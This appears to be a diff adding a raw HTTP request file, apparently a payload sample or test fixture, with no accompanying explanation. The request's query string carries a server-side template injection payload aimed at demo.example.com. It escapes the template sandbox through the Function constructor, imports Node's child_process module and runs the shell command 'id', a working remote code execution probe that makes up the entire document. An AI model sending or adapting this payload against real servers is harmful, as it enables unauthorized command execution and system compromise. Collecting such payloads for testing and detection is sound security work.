@@ -1,0 +1,4 @@
+GET /a?s={{%0aranges.constructor.constructor("return%0aimport")()('child_process').exec('id')%0a}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
